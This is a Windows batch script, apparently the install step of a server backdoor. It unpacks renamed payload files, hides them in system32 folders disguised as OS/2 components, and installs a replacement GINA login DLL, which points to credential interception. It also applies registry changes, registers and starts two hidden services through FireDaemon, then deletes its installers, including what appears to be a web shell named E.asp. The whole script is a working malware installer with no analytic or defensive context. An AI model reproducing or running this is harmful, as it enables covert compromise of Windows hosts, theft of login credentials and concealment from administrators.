@echo off
echo Renaming Files
ren 01.D dir.txt
ren 02.D FireDaemon.exe
ren 03.D login.txt
ren 04.D MMtask.exe
ren 05.D NewGina.dll
ren 06.D reggina.exe
ren 07.D regit.exe
ren 08.D restrict.exe
ren 09.D restsec.exe
ren 10.D settings.reg
ren 11.D SUD.exe
ren 12.D makeini.exe
ren 13.D SUD.ini
echo Making ini
.\makeini.exe %1
echo Making Dirs
md %windir%\system32\os2\dll\new
attrib %windir%\system32\os2\dll\new +s +h
.\restrict.exe %windir%\system32\os2\dll\new
md %1:\adminback0810\root
attrib %1:\adminback0810\root +s +h
.\restrict.exe %1:\adminback0810\root
md %1:\adminback0810\root\system
attrib %1:\adminback0810\root\system +s +h
.\restrict.exe %1:\adminback0810\root\system
md %1:\adminback0810\root\system\dll
attrib %1:\adminback0810\root\system\dll +s +h
.\restrict.exe %1:\adminback0810\root\system\dll
echo Copying Files
copy .\FireDaemon.exe %windir%\system32\os2\dll\new\ > nul:
copy .\SUD.exe %windir%\system32\os2\dll\new\ > nul:
copy .\SUD.bak %windir%\system32\os2\dll\new\ > nul:
copy .\login.txt %windir%\system32\os2\dll\new\ > nul:
copy .\dir.txt %windir%\system32\os2\dll\new\ > nul:
copy .\MMtask.exe %windir%\system32\os2\dll\new\ > nul:
copy .\newgina.dll %windir%\system32\ > nul:
attrib %windir%\system32\newgina.dll +s +h
echo Setting up Registry
.\regit.exe .\settings.reg
echo Installing Services
set MXBIN=%windir%\system32\os2\dll\new
set MXHOME=%windir%\system32\os2\dll\new
%windir%\system32\os2\dll\new\Firedaemon.exe -i OS2SRV "%windir%\system32\os2\dll\new" "%windir%\system32\os2\dll\new\SUD.exe" "" Y 0 0 N Y
%windir%\system32\os2\dll\new\Firedaemon.exe -i MMTASK "%windir%\system32\os2\dll\new" "%windir%\system32\os2\dll\new\MMtask.exe" "" Y 0 0 N Y
.\reggina.exe
echo Waiting 5 sec.
.\restsec.exe 5
echo Starting Services
net start os2srv
net start mmtask
echo Services Installed and Started
echo Deleting Install-Files
del FireDaemon.exe 
del makeini.exe
del SUD.exe
del SUD.ini
del SUD.bak
del login.txt
del dir.txt
del MMtask.exe
del newgina.dll
del restrict.exe
del regit.exe
del settings.reg
del reggina.exe
del restsec.exe
attrib E.asp -r
del E.asp
del dl.bat
del install.bat

